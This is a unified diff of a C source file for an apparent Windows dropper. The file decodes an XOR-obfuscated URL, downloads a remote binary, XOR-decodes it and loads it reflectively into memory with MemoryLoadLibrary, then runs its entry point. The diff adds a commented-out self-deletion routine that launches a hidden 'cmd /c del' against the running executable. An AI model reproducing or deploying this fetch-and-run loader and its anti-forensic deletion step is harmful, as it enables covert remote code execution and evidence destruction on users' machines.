@@ -1,13 +1,21 @@
 #define _CRT_SECURE_NO_WARNINGS
+#define _CRTDBG_MAP_ALLOC 
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
 #include <memory.h>
+
 #include <windows.h>
+#include <shlobj.h>
+
+#ifdef _DEBUG or _DEBUG_EXE
+#include <crtdbg.h>
+#endif // _DEBUG or _DEBUG_EXE
 
 #include "mem/memod.h"
 #include "utils.h"
+
 
 typedef int(CALLBACK* DLL_FUNCTION)();
 
@@ -24,6 +32,7 @@ typedef int(CALLBACK* DLL_FUNCTION)();
         0x6f, 0x23, 0x28, 0x2f, 0x41                                        \
   }
 // XOR => https://github.com/julesgrc0/ADR/raw/main/ADR.bin
+
 
 
 bool GetPayload(const char* url, char** payload, size_t* payload_size)
@@ -78,9 +87,63 @@ bool GetPayload(const char* url, char** payload, size_t* payload_size)
   return true;
 }
 
-int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
-                   _In_ char* pCmdLine, _In_ int nCmdShow) {
-#ifdef _DEBUG
+/*
+bool SelfDelete()
+{
+    SHELLEXECUTEINFO sei;
+
+    char szModule[MAX_PATH];
+    char szComspec[MAX_PATH];
+    char szParams[MAX_PATH];
+
+    if ((GetModuleFileNameA(0, szModule, MAX_PATH) != 0) &&
+        (GetShortPathNameA(szModule, szModule, MAX_PATH) != 0) &&
+        (GetEnvironmentVariableA("COMSPEC", szComspec, MAX_PATH) != 0))
+    {
+
+        strcpy(szParams, "/c del ");
+        strcat(szParams, szModule);
+        strcat(szParams, " > nul");
+
+        sei.cbSize = sizeof(sei);
+        sei.hwnd = 0;
+        sei.lpVerb = "Open";
+        sei.lpFile = szComspec;
+        sei.lpParameters = szParams;
+        sei.lpDirectory = 0;
+        sei.nShow = SW_HIDE;
+        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+
+        SetPriorityClass(GetCurrentProcess(),
+            REALTIME_PRIORITY_CLASS);
+        SetThreadPriority(GetCurrentThread(),
+            THREAD_PRIORITY_TIME_CRITICAL);
+
+        if (ShellExecuteExA(&sei))
+        {
+            SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
+            SetProcessPriorityBoost(sei.hProcess, TRUE);
+
+            SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
+
+            return true;
+        }
+        else
+        {
+            SetPriorityClass(GetCurrentProcess(),
+                NORMAL_PRIORITY_CLASS);
+            SetThreadPriority(GetCurrentThread(),
+                THREAD_PRIORITY_NORMAL);
+        }
+    }
+    return false;
+}
+*/
+
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ char* pCmdLine, _In_ int nCmdShow) 
+{
+#ifdef _DEBUG or _DEBUG_EXE
+    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
 
     if (AllocConsole()) 
     {
@@ -118,7 +181,8 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
   size_t payloadSize = 0;
 
   if (!GetPayload(url, &payload, &payloadSize)) return EXIT_FAILURE;
-#endif  // _DEBUG_EXE
+#endif  // _DEBUG or _DEBUG_EXE
+
   DecodeXor(payload, payloadSize, ADR_XOR_KEY);
   
   HMEMORYMODULE handle = MemoryLoadLibrary(payload, payloadSize);
@@ -131,5 +195,11 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
   main();
 
   MemoryFreeLibrary(handle);
+
+#ifdef _DEBUG or _DEBUG_EXE
+  _CrtDumpMemoryLeaks();
+#endif // _DEBUG or _DEBUG_EXE
+
+  //SelfDelete();
   return EXIT_SUCCESS;
 }
